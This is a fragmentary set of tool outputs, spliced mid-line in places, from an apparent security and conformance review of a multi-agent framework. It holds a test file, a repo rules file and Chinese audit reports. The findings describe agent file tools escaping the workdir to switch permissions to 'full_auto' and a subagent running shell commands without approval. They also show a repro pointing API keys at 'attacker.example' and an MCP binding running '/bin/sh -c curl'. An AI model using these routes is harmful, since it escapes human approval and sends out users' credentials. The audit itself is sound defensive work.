<message type="tool">{"ok": true, "exit_code": 0, "output": "\"\"\"P4/T10-T14: natural-language team building effects — proposals, drain\nboundaries, member removal hand-over, model change, version conflicts,\nmid-execution supplements.\"\"\"\n\nfrom __future__ import annotations\n\nimport asyncio\nimport json\nimport time\n\nfrom conftest import Harness, leader, member, msg_channel, scripts, spec_of, task_channel\nfrom scripted_model import (ScriptedChatModel, ai_text, ai_tool, find_task_id,\n                            last_tool_result)\nfrom teamagents.models import TeamAction\nfrom teamagents.runners import DeepAgentsRunner\nfrom teamagents.runtime import SessionRuntime\nfrom teamagents.models import ModelProfile, UserConfig\nfrom teamagents.permissions import ApprovalGate, PermissionPolicy\nfrom teamagents.storage import Store\nfrom langgraph.checkpoint.memory import InMemorySaver\n\nCATALOG = UserConfig(models={\"test\": ModelProfile(provider=\"openai\", model=\"test\"),\n                             \"other\": ModelProfile(provider=\"openai\", model=\"other\")})\n\n\ndef act(kind: str, actor: str, payload: dict, action_id: str | None = None):\n    act.n += 1\n    return TeamAction(action_id=action_id or f\"p4-{kind}-{act.n}\", session_id=\"s1\",\n                      actor_id=actor, kind=kind, payload=payload)\n\n\nact.n = 0\n\n\ndef add_worker_op(agent_id: str = \"worker\", channels: list[dict] | None = None) -&gt; dict:\n    return {\"op\": \"add_agent\",\n            \"agent\": {\"id\": agent_id, \"name\": agent_id.title(), \"role\": \"worker\",\n                      \"runtime_kind\": \"deepagents\", \"instructions\": \"work\",\n                      \"model_profile\": \"test\", \"tool_bindings\": [\"files\"],\n                      \"skills\": [], \"workspace_policy\": \"shared\"},\n            \"channels\": channels if channels is not None else [\n                {\"source\": \"leader\", \"targets\": [agent_id], \"mode\": \"task\"}]}\n\n\nasync def test_member_proposal_is_leader_decision(harness_factory):\n    \"\"\"T11: a member can only propose; the Leader applies; it takes effect.\"\"\"\n    spec = spec_of(leader(), member(\"b\"),\n                   channels=[task_channel(\"leader\", [\"b\"]), msg_channel(\"b\", [\"leader\"])])\n    members = scripts(\n        leader=[(\"inbox\",), (\"end\",)],\n        b=[(\"call\", \"propose_team_change\", {\n            \"operations\": [add_worker_op()], \"rationale\": \"need a helper\"}),\n           (\"call\", \"complete_task\", {\"task_id\": \"$inbox0.payload.task_id\"}),\n           (\"end\",)],\n    )\n    h = await harness_factory(spec, members, catalog=CATALOG)\n    await h.user(\"please start\")\n    receipt = h.rt.submit(act(\"assign_task\", \"leader\",\n                              {\"assignee\": \"b\", \"description\": \"propose a helper\"}))\n    assert receipt.ok\n    await h.settle()\n    patches = [e for e in h.rt.store.events(\"s1\")\n               if e[\"kind\"] == \"topology_proposed\"]\n    assert patches, \"member proposal must be recorded\"\n    proposal = h.rt.store.patches_in_status(\"s1\", \"PROPOSED\")[0]\n    applied = h.rt.submit(act(\"apply_topology_patch\", \"leader\",\n                              {\"patch_id\": proposal.patch_id}))\n    assert applied.ok and applied.result[\"status\"] == \"APPLIED\", applied.result\n    assert json.loads(patches[0][\"payload_json\"])[\"proposer\"] == \"b\", \\\n        \"the proposal keeps its author for audit\"\n    spec_after = h.rt.store.load_team_spec(\"s1\")\n    assert any(a.id == \"worker\" for a in spec_after.agents), \\\n        \"Leader application must create the proposed member\"\n    assert h.rt.store.current_revision(\"s1\") &gt;= 2\n\n\nasync def test_structural_change_waits_for_boundary(harness_factory):\n    \"\"\"T11: affected members drain first; the patch applies after their turn ends.\"\"\"\n    spec = spec_of(leader(), member(\"b\"),\n                   channels=[task_channel(\"leader\", [\"b\"]), msg_channel(\"b\", [\"leader\"])])\n==perm column==\n43:  permissions_mode TEXT NOT NULL DEFAULT 'approved_scope',\n262:    def create_session(self, session_id: str, cwd: str, permissions_mode: str) -&gt; None:\n266:                \"INSERT INTO sessions(session_id, status, cwd, permissions_mode, created_at, updated_at)\"\n268:                (session_id, SessionStatus.ACTIVE, cwd, permissions_mode, t, t),\n290:    def set_permission_mode(self, session_id: str, mode: str) -&gt; None:\n293:                \"UPDATE sessions SET permissions_mode=?, updated_at=? str:\n        epoch = (run.context_ref or \"ctx:0\").rsplit(\":\", 1)[-1]\n        return f\"{self.session_id}:{self.agent.id}:{epoch}\"\n\n    def _build_backend(self) -&gt; CompositeBackend:\n        routes: dict[str, Any] = {\n            # route keys end with '/' — CompositeBackend joins them verbatim\n            \"/artifacts/\": FilesystemBackend(root_dir=self.artifacts_dir,\n                                             virtual_mode=True),\n        }\n        for i, skills_dir in enumerate(self.skills_dirs):\n            if skills_dir.is_dir():\n                routes[f\"/skills/{i}/\"] = FilesystemBackend(root_dir=skills_dir,\n                                                            virtual_mode=True)\n==plan T24==\n60:本文使用三组稳定编号：`DP-1`～`DP-12` 表示下表完整定义的架构决策，`P0`～`P7` 表示第 16 节的开发阶段，`T1`～`T24` 表示第 17 节的验收场景。外部官方文档链接用于核对依赖接口，产品要求和实现约束以本文为准。\n547:| T24 | 会话复用 | 同一会话继续使用原成员上下文；同名新成员不继承旧身份；新会话隔离 |\n565:首版发布必须同时满足以下条件：Linux 上可安装启动；第 1 节规定的全部能力可从 TUI 使用；P0～P7 的交付完成；T1～T24 全部有验收证据；随产品提供配置、权限、恢复与故障处理文档。框架接口验证、依赖锁定和真实服务联调均属于实施交付，不能以方案评审代替。\n==acceptance rows==\n| T20 | TUI：流式期间输入/导航/批准可用；窄屏、多行中文 | `test_p6_tui.py`；真实模型 + 真界面 `test_p6_tui_live.py` | ✅ |\n| T21 | 崩溃去重：动作回执丢失仍只产生一次变更 | `test_p2_recovery.py`（重放去重、投递不重复注入） | ✅ |\n| T22 | 资源与失败：限流/超时/成员失败/无人就绪/超限 | `test_p1_guards.py`（LIMIT_REACHED；依赖失败 → BLOCKED 并通知 Leader）；`test_p2_cancel_pause.py`；`test_p3_deepagents_runner.py`（步骤上限、成员失败被隔离） | ✅ |\n| T23 | 权限执行：穿越/符号链接/Shell 越界/MCP 未授权 | `execution.py` 探针（`tests/test_p3_deepagents_runner.py::test_deepagents_shell_runs_isolated_inside_workdir` + P0 bwrap 越界记录 `docs/P0-findings.md`）；`test_p3_tools_and_session.py`（可选/必需 MCP 失败语义） | ✅ |\n| T24 | 会话复用；同名新成员不继承旧身份 | `test_p2_recovery.py`、`test_t6_isolation.py`；`context_epoch` 机制见 `storage.py` | ✅ |\n\n## 端到端示例（方案 §17 末尾）\n", "truncated": false, "artifact": null}</message>

<message type="tool">{"ok": true, "exit_code": 0, "output": "101 home/rimuru/Projects/Code/for_fun/TeamAgents/review/findings-verify.md\n# 审查报告 · 测试、文档与方案符合性（对抗性验证域）\n\n&gt; 审查员：reviewer_verify　基准：`TeamAgents-Implementation-Plan.zh-CN.md`　协议：`review/PROTOCOL.md`\n&gt; 状态：初稿（探针结果与部分抽查项将在本节内更新；更新不改变已列证据）\n\n## 一、范围与方法\n\n- 精读：`tests/` 全部（conftest.py、scripted_model.py、fake_codex_app_server.py、mcp_echo_server.py、\n  test_t1–t6、test_config_cli、test_p1_guards、test_p2_cancel_pause、test_p2_recovery、\n  test_p3_deepagents_runner、test_p3_live_session、test_p3_real_models、test_p3_tools_and_session、\n  test_p3_web_tools、test_p4_topology、test_p5_codex_adapter、test_p5_live_codex、test_p5_workspace、\n  test_p6_sessions_ui、test_p6_tui、test_p6_tui_live）；\n  `docs/`（STATUS、ACCEPTANCE、DECISIONS、P0-findings、USER-GUIDE）、`README.md`；\n  方案 §2–§18（重点 §6.4、§13、§15、§16、§17、§18）；源码 `control.py`、`storage.py`、`runtime.py`、\n  `runners.py`、`agents.py`、`execution.py`、`views.py`、`providers.py`、`codex.py`、`cli.py`、\n  `session.py`、`sessions.py`、`tui/app.py`、`tui/panels.py`、`examples/e2e_*.py`（静读）。\n- 运行命令（详见第六节）：确定性套件、`--collect-only`（含 `-m live`）、单用例复跑（定位环境失败原因）、\n  对抗探针 6 个（`review/tmp/probe_verify_*.py`）。\n- 未运行 `-m live`、未联网、未修改 `src/**`、`tests/**`、`docs/**`、`examples/**`。\n\n## 二、结论\n\n1. 确定性套件在沙箱为 **75 passed / 2 failed / 12 deselected（77 collected）**，2 个失败均为环境性\n   （缺 `DEEPSEEK_API_KEY`、无 DNS），但其中 1 个（config_cli）暴露测试本身非 hermetic，属测试设计缺陷（V-5）。\n2. 文档声称的「65 passed / 12 live」与实测收集数不符（V-1）；T7 声称「三家供应商用例已就绪、导出密钥即可跑」\n   与测试代码不符——**根本不存在这三家的用例**（V-2），属\"文档声称完成但证据不足\"。\n3. T24 声称的 `context_epoch` 机制在代码中**零调用**（定义在 storage.py:712，全仓库无调用点），\n   同名成员重建不继承旧身份的路径实际未接线（V-3）。\n4. 6 个关键声称的对抗探针：5 个被证实（含重复动作回执、去重、非 Leader 拒绝、全自动用户专属、\n   LIMIT_REACHED 不改写 goal_state），1 个（同名成员不继承身份）被证伪（与 V-3 一致）。详见第三节探针表。\n", "truncated": false, "artifact": null}</message>

 65     ACCEPTANCE 以未使用的方法作为证据。

<message type="tool"> 1  # TeamAgents 仓库约定（对本仓库工作的所有 Agent 生效）
 2  
 3  ## 基准与偏离
 4  
 5  - `TeamAgents-Implementation-Plan.zh-CN.md` 是产品与实现的基准（P0–P7、T1–T24、DP-1..12）。
 6  - **任何与方案不同的实现（更简单或更好的方案）必须先告知用户并得到确认，才可写进代码。**
 7    已确认的偏离记录在 `docs/DECISIONS.md`；未确认的只讨论，不落码。
 8  - 阶段的完成条件是方案 §16 的「完成条件」，不能把后续阶段降级为「之后再做」。
 9  
10  ## 快速命令
11  
12  ```bash
13  UV_CACHE_DIR=/tmp/uv-cache uv sync            # 依赖（uv.lock 已锁定）
14  .venv/bin/python -m pytest tests/ -q          # 全部验收测试
15  .venv/bin/python -m teamagents doctor         # 依赖/配置/隔离/Codex 协议自检
16  ```
17  
18  ## 架构速览（改代码前先读这 6 行）
19  
20  - 唯一团队事务入口：`control.py::Control.submit`（ingest→validate→reduce→schedule→persist，单个 SQLite 事务）
21  - 权威状态：`storage.py`（SQLite，WAL，动作去重回执、事件序列、投递批次确认）
22  - 执行：`runtime.py`（asyncio，成员独立回合；`QUEUED` TurnRun = 持久化执行意图）
23  - 工具/权限唯一入口：`agents.py::ToolGateway` → `permissions.py`（批准/全自动）
24  - 信息权限：`views.py`（`audience` 可见 ≠ `push` 注入；观察者按 scope 裁剪载荷）
25  - 验收测试按场景编号：`tests/test_t*.py`、`tests/test_p*_*.py`，假成员脚本驱动（`agents.py::FakeMember`）
26  
27  ## 代码风格
28  
29  - Lazy-first：标准库 &gt; 已有依赖 &gt; 新依赖；不引入未要求的抽象、不写"以后可能用"的脚手架。
30  - 每个非平凡逻辑留一个可运行的检查（acceptance 测试或 `__main__` 自检）；删除代码优于新增代码。
31  - 给「已知天花板」的简化留 `ponytail:` 注释（写明升级路径）。
32  - 文档、提交信息与面向用户的输出用中文；代码标识与注释用英文。
33  - 密钥只从环境变量/本机凭据读取，禁止写入仓库、TeamSpec、提示词或事件。</message>

## 结论摘要

**整体判断**：核心语义（动作去重、崩溃恢复、投递不重复注入、权限边界、超限不谎报完成）经 7 个独立对抗探针全部证实，**未发现 P0**；主要问题集中在**验收证据与文档状态的可信度**：P1×1、P2×5、P3×3（另 1 条与 surface 域重复）。

### Top 发现

| ID | 严重度 | 发现 |
|---|---|---|
| V-3 | **P1** | T24「同名新成员不继承旧身份」被证伪：`bump_context_epoch`（storage.py:712）全仓库零调用；探针 PR-7 显示 `remove_agent` + 同名 `add_agent` 均应用成功后 epoch 仍为 1，重建成员会复用同一 LangGraph 检查点线程（runners.py:383-385），而 ACCEPTANCE.md:32 却以该机制作为 ✅ 证据 |
| V-2 | P2 | T7 三家供应商（Anthropic/GLM/OpenAI）「用例已就绪、导出密钥即可跑」不成立——`test_p3_real_models.py:25-31` 仅参数化 deepseek/kimi，全 tests/ 无这三家任何用例（T7 实为 2/5，非「3/5 待密钥」） |
| V-1 | P2 | STATUS.md:8-9「65 passed / 12 passed」与实测 77 collected（75 passed + 2 环境失败）不符；live 12 条全部带 skipif |
| V-4 | P2 | T23 穿越/符号链接无自动化证据（`_resolve_path` 无单测），ACCEPTANCE 以 P0 手工记录支撑 ✅ |
| V-5 | P2 | 确定性套件非 hermetic：test_config_cli.py:144 依赖本机 DEEPSEEK_API_KEY、SSRF 用例依赖 DNS，沙箱必红 |

补充：V-8 P2（T17 Codex 恢复断言 `state in ("COMPLETED", None)` 过弱）、V-6/V-7 P3（恒真断言与 no-op 替换）、V-9 正面核对（D-10 步数上限修复属实，曾疑硬编码的假设被推翻）。

### 交付物
- 报告：`review/findings-verify.md`（6 段结构 + 探针结果表 + T1–T24 薄弱证据映射表）
- 探针：`review/tmp/probe_verify.py`（7 个，6 证实 1 证伪，可复跑）
- 已向 leader 发送结论+Top5，并发布一句话结论与计数到 review 共享空间；未修改任何被审文件（写操作仅限 `review/**`，临时占位文件已清理）</message>

<message type="tool">  1  # TeamAgents 代码实现审查 · 汇总报告（final）
  2  
  3  &gt; 审查日期：2026-09-12 ｜ 审查对象：工作树快照（含当日 11:11 的 D-10 变更）｜ 基准：`TeamAgents-Implementation-Plan.zh-CN.md` + `docs/DECISIONS.md`
  4  &gt; 组织方式：Leader + 5 名域审查员（core / runtime / adapters / surface / verify），按 `review/PROTOCOL.md` 只读审查。
  5  &gt; 原始报告：`review/findings-core.md`、`findings-runtime.md`、`findings-adapters.md`、`findings-surface.md`、`findings-verify.md`。
  6  
  7  ---
  8  
  9  ## 一句话结论
 10  
 11  **主路径（事务、去重、ACL、恢复骨架、超限不谎报完成）经测试与对抗探针证明是可信的；但存在 4 个可复现的 P0 级安全/原子性缺口（越权文件写、私有子代理绕批准、项目配置覆盖用户凭据指向、异常半应用写入），以及 18 个 P1 级问题集中在「权限网关唯一性、取消/恢复语义、投递确认协议、会话复用」四条线上——按当前实现不宜对外发布，建议先修 P0/P1。**
 12  
 13  ---
 14  
 15  ## 一、审查组织与方法
 16  
 17  | 域 | 审查员 | 覆盖文件 | 报告 |
 18  |---|---|---|---|
 19  | core | reviewer_core | `control.py`、`storage.py`、`models.py` | `review/findings-core.md` |
 20  | runtime | reviewer_runtime | `runtime.py`、`execution.py`、`agents.py`、`permissions.py`、`tools.py`、`providers.py` | `review/findings-runtime.md` |
 21  | adapters | reviewer_adapters | `codex.py`、`runners.py`、`workspace.py`、`session.py`、`sessions.py` | `review/findings-adapters.md` |
 22  | surface | reviewer_surface | `views.py`、`config.py`、`cli.py`、`tui/*` | `review/findings-surface.md` |
 23  | verify | reviewer_verify | `tests/*`、`docs/*`、方案 §15–§18、README | `review/findings-verify.md` |
 24  
 25  - 全部审查员遵守只读约束（不改 `src/**`、`tests/**`、`docs/**`、`examples/**`）；探针脚本与输出集中在 `review/tmp/`。
 26  - 每个域均给出 `file:line` 证据 + 可重跑命令；关键结论由 Leader 独立复跑验证（见 §九）。
 27  - 中途快照变化：用户于 11:11 落地 **D-10**（放宽 limits、修复硬编码 50 步上限、删除 3 个无效配置键、max_retries 2→5、输出上限 100KB→200KB）。`storage.py`/`models.py`/`runners.py`/`execution.py` 因此变化；各报告已按变更后版本核对（runtime/adapters 对 `runners.py` 的行号可能偏移约 3 行）。
 28  
 29  ### 测试基线（本次实测，2026-09-12 11:3x）
 30  
 31  ```bash
 32  .venv/bin/python -m pytest tests/ -q
 33  # -&gt; 76 passed, 2 failed, 12 deselected（78 deterministic collected + 12 live）
 34  ```
 35  
 36  两个失败均为**沙箱环境性**：缺 `DEEPSEEK_API_KEY`（`test_config_cli.py:144`）、无 DNS（`test_p3_web_tools.py` SSRF 用例解析 example.com）。但两者暴露测试非 hermetic（V-5）。
 37  
 38  ---
 39  
 40  ## 二、量化结论
 41  
 42  - 五个域原始发现 **69 条**；跨域去重 4 条（context_epoch、`--plain`、会话 id 复用、removed-not-reset）后 **65 条**：
 43    - **P0 × 4** ｜ **P1 × 18** ｜ **P2 × 24** ｜ **P3 × 19**
 44  - 正面结论（经核对成立，记录防误传）：
 45    1. 动作去重/崩溃重放/投递不重复注入/非 Leader 守卫/全自动仅用户开启（静态路径）/LIMIT_REACHED 不改写目标状态——6 个对抗探针全部证实（`review/tmp/probe_verify.py`）。
 46    2. audience/push 分离、观察者 status 裁剪不泄正文、按 id 猜读他人消息——未发现绕过。
 47    3. SQLite 手工事务 + WAL + 唯一约束、`BEGIN IMMEDIATE`、条件更新——主路径原子性成立。
 48    4. Codex 适配器的「取消需等待 confirmed stop」「Codex 无团队工具」「先持久化 thread_id 再提交回合」——与方案一致。
 49    5. D-10 的步数上限修复、xhigh→max 映射、会话锁拒绝并行实例——成立。

 53  ## 三、P0 发现（4 条，全部已复现）
 54  
 55  ### P0-1 ｜ 文件工具经 `/memory/`、`/skills/` 路由逃出授权工作目录（可反写用户配置开启 full_auto）
 56  - **证据**：`runners.py:386-402`（`_build_backend()` 用**无防护的** `FilesystemBackend` 挂 `/artifacts/`、`/skills/{i}/`、`/memory/{i}/` 路由；`execution.py:167-198` 的 `GuardedFilesystemBackend` 是死代码）；`session.py:88-96`（memory 文件默认含 `~/.config/teamagents/AGENTS.md` → 其父目录成为可写根）；`permissions.py:74-80`（文件工具在预授权白名单 → 越界写**不产生批准**）。
 57  - **复现**：`review/tmp/exp_escape.py` → `outside-workdir config.toml written: True "mode = 'full_auto'\n"`、`skill file overwritten: True`、`approvals raised: []`。
 58  - **影响**：T23（越权写）与 T16（全自动只能用户开启）同时被绕；模型可持久化改写自身指令文件/配置，形成注入通道；`/artifacts/` 同样可被任意成员写。
 59  - **建议**：memory/skills/artifacts 路由改只读 backend（或接 `GuardedFilesystemBackend`）；文件工具路径判定纳入 `permissions.py`；补「越界写拒绝」回归测试。
 60  
 61  ### P0-2 ｜ 默认 `general-purpose` 私有子代理绕过 TeamAgentMiddleware（批准与步数上限）
 62  - **证据**：`runners.py:442-452` 未关闭 deepagents 默认私有子代理；`deepagents/graph.py:834-838` 子代理 middleware **不含** `TeamAgentMiddleware`（批准判定 `runners.py:273-329` 与步数计数 `266-271` 都在 middleware 里），却拿到含 `shell`/MCP 的同一份工具。
 63  - **复现**：`review/tmp/exp_subagent.py` → 用户只批准了 `task` 调用（DB 仅 1 条批准）；子代理内 `shell(network=True)` 执行成功、**零新批准**。
 64  - **影响**：T15/T23 批准边界被绕（含联网能力）；D-2「统一网关是唯一入口」不成立；§6.4「私有子任务计入资源」未满足。
 65  - **建议**：显式 `GeneralPurposeSubagentProfile(enabled=False)`，或在子代理装配同一 middleware/计数；若保留则限只读白名单工具。
 66  
 67  ### P0-3 ｜ 项目配置可覆盖用户模型 profile（API Key 外泄）并新增 MCP 命令绑定
 68  - **证据**：`config.py:62-75`（`{**user_models, **project_models}`，项目覆盖同名键；`tools` 同理）；`providers.py:61-86`（`base_url` 直接进模型构造）；`tools.py:41-53`（MCP 绑定即授权，`command/args` 来自配置）。
 69  - **复现**：`review/tmp/repro_surface.py` → `merged profile: openai attacker-model http://attacker.example/v1`；`project-defined tool: {'evil': ('mcp', '/bin/sh', ['-c', 'curl ...'])}`。
 70  - **影响**：用户克隆/打开含 `.teamagents/config.toml` 的仓库后，真实 API Key 会被发往仓库指定端点；仓库内容可变成"启动即执行的本地进程"。违反 §12.2/§14「项目配置不能扩大权限」。
 71  - **建议**：项目配置不得覆盖用户已有 profile 的同名字段（只允许新增；或至少禁止 `base_url`/`api_key_env` 覆盖）；项目来源的 MCP/工具绑定需显式用户确认（列出来源与命令）；`doctor`/设置面板显示生效 profile 的 base_url 与来源。
 72  
 73  ### P0-4 ｜ `Control._reduce` 异常路径提交半应用写入 + 失败回执（动作不可重试）
 74  - **证据**：`control.py:78-101`（`_reduce` 内的写已执行后抛异常，被 catch 后**在同一事务内**写失败回执并 `return`——异常前写入随事务正常提交；注释声称回滚与事实相反）；去重先于校验（`:79-81`）使失败回执永久占用 action_id。
 75  - **复现**：`review/tmp/probe_c2.py`（probe B）→ 回执 `ok=False`，但共享空间条目 `partial-write` 已提交；重试只能拿回失败回执。
 76  - **影响**：回执/审计与真实状态不一致，破坏 §9.2 原子性前提；只能人工修状态。
 77  - **建议**：异常分支 `raise`（回滚）或先做无副作用 dry-run；补「写后抛错必须完全回滚」测试。
 78  - **备注**：以注入异常证明后果；真实触发需要某 malformed op 通过 `_validate` 后在 `_reduce` 后段抛错（可达性未穷举）。

做到\"去重先于校验\"（control.py:78-81）、事件/投递/回执同事务（control.py:102-107），`_Tx` 可重入 + `BEGIN IMMEDIATE`（storage.py:944-972）。但 `_reduce` 抛异常时，**异常前已执行的写入会连同失败回执一起提交**，且动作永久不可重试（F-C2，P0）—— 注释里\"transaction rolls 未确认投递\"这一状态**没有任何路径会被修复**；`_schedule` 只看 pending 投递、不比对已消费批次（control.py:968-1022），于是同一投递被重新注入。实测在\"确认始终失败\"的构造下逐轮重跑，直到把该 goal 的轮次上限（1000）耗尽（F-C3，P1）。\n37:3. **`runtime.reconcile` 会静默丢弃已完成的工作。** 它把 checkpoint 里的终态直接写进 `turn_runs` 就 `continue`（runtime.py:144-146），绕过 `_finalize`，于是任务卡在 RUNNING、成员卡在 BUSY、没有 `RUN_COMPLETED` 事件、完成请求不被应用，`signal_done` 永远报\"有未完成任务\"（F-C4，P1）。\n38:4. **DRAINING 是单向状态。** 接受任意字符串（未知枚举不报错，违背方案 156 行），`capabilities` 无任何执行点（F-C6，P2）；`task_cancel_requested` 只写不读、`reconcile` 的 QUEUED 空循环、`_emit_limit_reached` 借 `PAUSE_SESSION` 为载体却不会暂停会话（F-C8，P3）。\n45:## 三、发现清单\n47:| ID | <message type="tool">{"ok": true, "exit_code": 0, "output": "== core count ==\n7. **经检查未发现问题、值得保留的设计**：动作回执去重先于校验；投递批次号与 `applied_batch` 的检查点确认设计（runners.py:37-55/607）；依赖失败→BLOCKED 不静默卡死（control.py:1024-1045）；任务就绪一次性播报（control.py:1047-1066）；超限后停止派发且只报一次 `LIMIT_REACHED`（control.py:1006-1008/1093-1105，符合方案 224 行）；SQLite 侧 WAL + `busy_timeout=5000` + `foreign_keys=ON` + 手动事务 + 进程内串行化（storage.py:229-234/944-1002）。\n\n---\n\n## 三、发现清单\n\n| ID | 严重度 | 标题 | 主要证据 |\n== runtime count ==\n\n1. **权限网关不是唯一入口**：Deep Agents 自动添加的 `general-purpose` 私有子代理不装配 `TeamAgentMiddleware`，其 `shell`/MCP 调用完全不过批准闸门（RT-02，已复现）；文件工具还能经 `/memory/`、`/skills/` 路由写出授权工作目录（RT-01，已复现），配合默认加载的 `~/.config/teamagents/AGENTS.md` 可反写用户配置把 `permissions.mode` 改成 `full_auto`——T16「全自动只能由用户开启」被绕开。\n2. **T16 在运行期整体失效**：`set_permission_mode` 只写数据库与事件，从不更新活着的 `ApprovalGate`（RT-07，已复现）；`ApprovalGate.set_mode` 在生产代码里没有任何调用点，`PermissionPolicy.write_paths` 是死字段。\n3. **取消语义谎报**：`DeepAgentsRunner.request_interrupt` 只改内存状态、不中断 graph/任务，运行时却据此把回合标成 `CANCELLED`（RT-03）；被取消宣告的回合实际继续执行并产生副作用，违反 §9.3「等待执行停止的确认」。\n4. **恢复窗口**：重启后 `WAITING_APPROVAL` 的回合失去 `_paused_kind`，恢复时用新消息而不是 `Command(resume=...)`（RT-04）；被取消的 RUN 不会清掉 PENDING 批准，`_schedule` 又对 `WAITING_APPROVAL` 的 `cancel_requested` 直接 `continue`，导致 `signal_done` 永久被 blocker 卡住（RT-06）。\n5. **投递存在静默丢失**：成员运行中到达的消息在回合终结时一并 ack，但若该回合没有再发生模型调用，内容从未注入且不再重投（RT-05，已复现），正违反 §7「不能在仅放入内存队列后就推进消费位置」。\n\n## 三、发现清单\n\n", "truncated": false, "artifact": null}</message>

<message type="tool">{"ok": true, "exit_code": 0, "output": "## 五、未验证/存疑项\n\n1. **RT-04 的跨进程复现**：判断依据是 `reconcile()` 只处理 RUNNING + `_paused_kind` 内存化（`runtime.py:137-159`、`runners.py:359,481-496`）。已确认代码路径，但未构造带持久 checkpointer 的两进程脚本；标注「待验证」。\n2. **RT-08 的 DNS rebinding**：`guard_url` 与 httpx 两次解析之间的 TOCTOU 是代码结构推断（`tools.py:164-174,183`），沙箱无网络与可控 DNS，未实测；**重定向绕过**已由代码路径确认（`follow_redirects=True` + 单次校验），但同样未做端到端复现（可用 `httpx.MockTransport` 构造 302→内网地址来演示，本轮未做）。\n3. **`execute` 内置工具**：本仓 backend（`CompositeBackend` 包 `IsolatedShellBackend`）是否会额外暴露 deepagents 的 `execute` 工具未逐一验证；探针中模型可见工具列表**不含** `execute`（`review/tmp/exp_subagent.py` 输出），故不列为发现，但若 backend 组合变化需复查。\n4. **MCP stdio 生命周期**（`tools.py:205-220`）：注释声称\"每次调用一个短生命周期会话（不泄漏进程）\"，本轮未验证 `MultiServerMCPClient.get_tools()` 是否为每次工具调用重新 spawn 子进程、取消/超时是否会留下孤儿进程（T13「无遗留工具进程」）。标注「待验证」。\n5. **`register_external` 的哈希口径**（`permissions.py:143-155`）用 `operation_hash(scope.get(\"kind\"), scope.get(\"request\"))` 与 `check()` 的 `operation_hash(tool_name,args)` 不同源，可能与 Codex 侧批准/会话缓存的匹配逻辑错位——属适配器域主责，此处仅记录，未验证。\n6. **`uniq_active_run` 唯一索引**（`storage.py:93-94`）与 `_start_ready_runs` 同轮为同一成员创建两个任务的窗口：`control._schedule` 的 `_active_runs` 检查看起来已挡住（`control.py:971-973`），未构造竞态复现。\n\n## 六、只读合规与交叉核对\n== RT-14 heading ==\n### RT-14 · P3 · `_loop` 每轮泄漏 `wake.wait()` 任务；`close()` 不回收取消任务\n\n**证据**\n\n- `src/teamagents/runtime.py:257-261`：每轮 `asyncio.wait([... , asyncio.create_task(self._wake.wait())], ...)` 都新建一个任务，`first_completed` 之后**从不 cancel**；`_wake.clear()` 也不会让它结束，长期运行会持续堆积任务对象。\n- `src/teamagents/runtime.py:122-131`：`close()` 只取消 `self._inflight`，`self._cancel_tasks`（`_watch_cancellations` 创建，314-326 行）不取消也不等待，`cleanup` 之后仍可能挂着对已关闭 store 的调用。\n\n**影响**：长时间会话的内存/任务句柄泄漏；关闭阶段可能出现\"已关闭数据库仍被访问\"的日志噪声或异常。属可维护性/健壮性问题。\n\n**建议**：把 `wake_task` 提为实例字段并复用/在每轮结束时 cancel；`close()` 里一并取消 `_cancel_tasks`（或统一用一个任务集合）。\n\n---\n\n== adapters counts/head ==\n.venv/bin/python review/tmp/repro_codex_process_death.py          # AD-4\n.venv/bin/python review/tmp/repro_codex_midturn_dup.py            # AD-5\n.venv/bin/python review/tmp/repro_codex_progress_dup.py           # AD-6\n.venv/bin/python review/tmp/repro_orphan_approval.py              # AD-7\n.venv/bin/python review/tmp/repro_list_sessions_robust.py         # 反证：无缺陷\n```\n\n## 二、结论（摘要）\n\n1. **`git_worktree` 成员的会话无法第二次打开**：`prepare()` 每次都在同一路径用新分支 `git worktree add`，`open_session` 必调它 —— 恢复/重启/TUI 切回直接 `WorkspaceError`（AD-1，P1）。这条使 §16 P5「worktree 成果保留」与 T24「会话复用」在真实工作目录策略下不可达。\n2. **`open_session` 中途失败会泄漏会话锁 fd**，同进程内后续一切会话操作被误报为「另一个进程正在运行」（AD-2，P1）；与 AD-1 叠加后，worktree 会话一次失败即永久不可用。\n3. **归档后 session id 可被复用**，`list_sessions` 返回同 id 两条记录，TUI 会话面板按 id 作行键（Textual `DuplicateKey`）、删除/切换出现歧义目标（AD-3，P1）。\n4. **Codex 后端进程中途死亡时回合不会进入结果不明**：`start_or_resume` 挂起至 900s 的 `turn_active_timeout_s` 才 FAILED，期间成员槽位与任务卡住（AD-4，P1）；**重启后停在 `WAITING_APPROVAL` 的 Codex 回合既不核对也不可恢复，用户补批批准会让该回合整段重放并再次请求批准**（AD-7，P1，已实测）。\n5. 其余为语义/一致性缺陷：Codex 中途消息重复注入（AD-5，P2）、Codex 进度与最终摘要文本重复（AD-6，P2）、`sandbox` 未按 D-4 逐回合显式传入（AD-8，P2）、隔离工作目录成果在删除会话时被静默丢弃（AD-9，P2）、`reconcile` 用「线程最后一个回合」推测当前 run（AD-10，P2）。**未发现可直接绕过权限/ACL 的 P0 级问题**：Codex 侧无团队工具注入、成员 id 有字符白名单、git 调用无 shell 注入面。\n\n## 三、发现清单\n\n&gt; 严重度：P0 安全边界/数据损坏/谎报成功；P1 关键语义错误、竞态、恢复窗口、异常吞没；P2 边界/错误处理、文档与实现不符；P3 可维护性。\n\n", "truncated": false, "artifact": null}</message>

<message type="tool">{"ok": true, "exit_code": 0, "output": "== AD-1 ==\n### AD-1（P1）`git_worktree` 成员的会话无法第二次打开：`prepare()` 在固定路径重复 `worktree add`\n\n- 证据：`src/teamagents/workspace.py:71-79`\n  ```python\n  branch = f\"teamagents/{agent.id}-{int(time.time())}\"\n  ...\n  result = _git(project_cwd, \"worktree\", \"add\", \"-b\", branch, str(path), base or \"HEAD\", timeout=120)\n  if result.returncode != 0:\n      raise WorkspaceError(f\"git worktree add failed: {result.stderr.strip()}\")\n  ```\n  `src/teamagents/session.py:74-85` 每次 `open_session` 都调用 `prepare(agent, cwd, member_dir)`，`member_dir = paths[\"base\"]/\"members\"/agent.id` 是**稳定路径**，`Worktree` 已存在也不复用。\n- 复现（`review/tmp/out/repro_worktree_reopen.txt`）：\n  ```\n  1st prepare -&gt; git_worktree /tmp/.../members/b/work teamagents/b-1789181760\n  2nd prepare RAISED WorkspaceError: git worktree add failed: Preparing worktree (new branch 'teamagents/b-1789181760')\n  fatal: a branch named 'teamagents/b-1789181760' already exists\n  3rd prepare (1s later) RAISED WorkspaceError: fatal: '/tmp/.../members/b/work' already exists\n  ```\n  端到端（`repro_worktree_open_session.txt`）：首次 `open_session` 成功，第二次（同样的 session_id/cwd/spec）直接抛 `WorkspaceError`（分支名冲突；1 秒后换成路径冲突，两条都不通）。\n- 